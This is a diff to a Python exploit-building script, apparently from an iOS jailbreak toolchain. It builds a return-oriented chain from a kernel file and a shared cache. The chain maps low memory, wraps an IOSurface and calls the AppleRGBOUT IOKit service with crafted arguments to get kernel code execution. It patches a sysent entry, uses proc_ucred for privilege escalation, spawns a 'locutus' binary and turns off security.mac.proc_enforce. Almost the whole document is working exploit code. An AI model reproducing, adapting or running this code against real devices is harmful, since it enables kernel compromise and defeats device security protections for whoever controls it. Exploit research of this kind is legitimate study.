@@ -13,6 +13,8 @@ mode, cachefile, kernfile, patchfile = sys.argv[1:]
 assert mode in ['dejavu', 'two']
 patchfp = open(patchfile)
 
+stack43 = False # XXX
+
 def read(f, size):
     result = f.read(size)
     if len(result) != size: raise Exception('truncated')
@@ -28,15 +30,36 @@ def dbg_result():
 
 dmini.init(kernfile, False)
 
-# R4 R7 PC
-
-
-# mcr p15, 0, r0, c3, c0, 0; bx lr
-mcrdude = dmini.cur.find_basic('- 10 0f 03 ee 1e ff 2f e1') + 0
-# sub sp, r7, #20; pop {r8, r10}; pop {r4-r7, pc}
-popdude = dmini.cur.find_multiple('+ a7 f1 14 0d bd e8 00 05 f0 bd', '?')
-
 proc_ucred = dmini.cur.sym('_proc_ucred')
+weirdfile = Connection('kcode.o', False).nth_segment(0)[:-4] + struct.pack('I', proc_ucred)
+while True:
+    namelen = patchfp.read(4)
+    if len(namelen) == 0: break
+    if len(namelen) != 4: raise Exception('truncated')
+    name = read(patchfp, struct.unpack('I', namelen)[0])
+    addr, = struct.unpack('I', read(patchfp, 4))
+    data = read(patchfp, struct.unpack('I', read(patchfp, 4))[0])
+    if name == 'sysent patch':
+        sysent_patch, = struct.unpack('I', data)
+    elif name == 'sysent patch orig':
+        sysent_patch_orig, = struct.unpack('I', data)
+    elif name == 'scratch':
+        scratch, = struct.unpack('I', data)
+    if addr == 0 or len(data) == 0 or name.startswith('+'): # in place only
+        continue
+    weirdfile += struct.pack('II', addr, len(data)) + data
+weirdfile += struct.pack('IIII', sysent_patch, 4, sysent_patch_orig, 0)
+
+#set_fwd('PC0', dmini.cur.find_basic('- 00 f0 96 e8')) # ldm r6, {ip, sp, lr, pc}
+#set_fwd('PC0', dmini.cur.find_basic('- 00 f0 b4 e9')) # ldm r4!, {ip, sp, lr, pc}
+
+init('PC')
+make_avail()
+code_addr = 0x80000400 # xxx
+funcall('_memcpy', code_addr, ptr(weirdfile), len(weirdfile))
+set_fwd('PC', code_addr)
+kstuff = finalize(0x1000)
+assert len(kstuff) < 0x1000
 
 dmini.init(cachefile, True)
 
@@ -47,7 +70,6 @@ def wrap(num):
         return num
 dmini.cur.wrap = wrap
 
-plist = ''
 if mode == 'dejavu':
     init('R4', 'R5', 'PC')
     make_r7_avail()
@@ -81,82 +103,58 @@ for i in xrange(mtss_count):
 
 protp = ptrI(0)
 zerop = ptrI(0)
-thousandp = ptrI(0x1000)
+p_2000 = ptrI(0x2000)
 
 if mode == 'dejavu':
     # before we remap, save 0x1000 so we can have it back
-    # we want to remap 
-    # find_kernel_ldm -> 0
-    # stub & ~0xfff -> 0x1000
-
+    # only required in Safari
     funcall('_mach_task_self')
 
     sizep = ptrI(0x1000)
     memory_entry, memory_entryp = stackunkpair()
     funcall('_mach_make_memory_entry', None, sizep, 0x1000, 5, memory_entryp, 0); dbg_result()
 
-funcall('_vm_deallocate', mtss.pop(), 0, 0x2000); dbg_result()
+funcall('_vm_deallocate', mtss.pop(), 0x1000, 0x1000); dbg_result()
 
-funcall('_vm_remap', mtss.pop(), zerop, 0x1000, 1, 0, mtss.pop(), ldm & ~0xfff, 0, protp, protp, 2); dbg_result()
-funcall('_vm_remap', mtss.pop(), thousandp, 0x1000, 1, 0, mtss.pop(), stub & ~0xfff, 0, protp, protp, 2); dbg_result()
 
-funcall('_mlock', 0, 0x2000); dbg_result()
+funcall('_vm_allocate', mtss.pop(), 0x1000, 0x1000, 0); dbg_result()
+funcall('_memcpy', 0x1000, ptr(kstuff), len(kstuff))
 
-plist = '<array><data>%s</data></array>' % base64.b64encode(kernstuff)
+funcall('_mlock', 0x1000, 0x1000); dbg_result()
 
-if mode == 'dejavu':
-    zplist = zlib.compress(plist, 9)
-    funcall('_malloc', len(plist))
-    plistp, plistpp = stackunkpair()
-    store_r0_to(plistpp)
-    dmini.cur.push_file('/usr/lib/libz.dylib')
-    funcall('_uncompress', None, ptrI(len(plist)), zplistp, len(zplist))
-    dmini.cur.pop_file()
-    dbg_result()
-else:
-    plistp = ptr(plist)
+w, h = 1, 0x1000
+funcall('_IOSurfaceWrapClientImage', 0x41424752, w, h, 4, 4*w*h, 0)
+dbg_result(); funcall('_abort')
+surface, surfacep = stackunkpair()
+store_r0_to(surfacep)
+funcall('_IOSurfaceGetID', None)
+surface_id, surface_idp = stackunkpair()
+store_r0_to(surface_idp)
 
-#funcall('_abort')
-dmini.cur.push_file('/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
-funcall('_IOCatalogueSendData', 0, 1, plistp, len(plist))
-dmini.cur.pop_file()
-dbg_result()
+if mode == 'two':
+    # XXX is this necessary? it's from star
+    funcall('_IOKitWaitQuiet', 0, ptrI(0, 0, 0))
 
-# copy the real code we want to run in the kernel
-weirdfile = open('kcode.bin').read()[:-4] + struct.pack('I', proc_ucred)
+# XXX
+funcall('_IOServiceMatching', ptr('AppleRGBOUT', True))
+connect = ptrI(0)
+funcall('_IOServiceOpen', None, mtss.pop(), 0, connect); dbg_result()
+js = ptrI(surface_id, 0, 6, 0)
+funcall('_IOConnectCallScalarMethod', connect, 1, js, 2, 0, 0, load_r0=True)
 
-# (and parse the patchfp)
-while True:
-    namelen = patchfp.read(4)
-    if len(namelen) == 0: break
-    if len(namelen) != 4: raise Exception('truncated')
-    name = read(patchfp, struct.unpack('I', namelen)[0])
-    addr, = struct.unpack('I', read(patchfp, 4))
-    data = read(patchfp, struct.unpack('I', read(patchfp, 4))[0])
-    if name == 'sysent patch':
-        sysent_patch, = struct.unpack('I', data)
-    elif name == 'sysent patch orig':
-        sysent_patch_orig, = struct.unpack('I', data)
-    elif name == 'scratch':
-        scratch, = struct.unpack('I', data)
-    if addr == 0 or len(data) == 0 or name.startswith('+'): # in place only
-        continue
-    weirdfile += struct.pack('II', addr, len(data)) + data
-
-weirdfile += struct.pack('IIII', sysent_patch, 4, sysent_patch_orig, 0)
-
-funcall('_memcpy', scratch, ptr(weirdfile), len(weirdfile))
-store_val_to(scratch, sysent_patch)
-funcall('_syscall', 0); dbg_result()
-
-# we're back in sanity land, do some housekeeping
+# do some housekeeping
 # (but don't bother if we're going to exec)
 if mode == 'dejavu':
+    funcall('_CFRelease', surface)
+    funcall('_IOSurfaceClose', connect, load_r0=True)
+
     funcall('_munlock', 0, 0x2000); dbg_result()
     funcall('_vm_deallocate', mtss.pop(), 0, 0x2000); dbg_result()
     funcall('_vm_allocate', mtss.pop(), zerop, 0x1000, 0); dbg_result()
     funcall('_vm_protect', mtss.pop(), 0, 0x1000, 0, 0); dbg_result()
     funcall('_vm_map', mtss.pop(), thousandp, 0x1000, 1, 0, memory_entry, 0, 0, 5, 5, 2); dbg_result()
+
+    # the boring stuff
 
     O_WRONLY = 0x0001
     O_CREAT  = 0x0200
@@ -180,6 +178,7 @@ if mode == 'dejavu':
     dbg_result()
     funcall('_posix_spawn', 0x11000000, locutus_str, 0, 0, ptrI(locutus_str, 0), zerop)
     dbg_result()
+
 funcall('_sysctlbyname', ptr('security.mac.proc_enforce', True), 0, 0, zerop, 4)
 dbg_result()
 
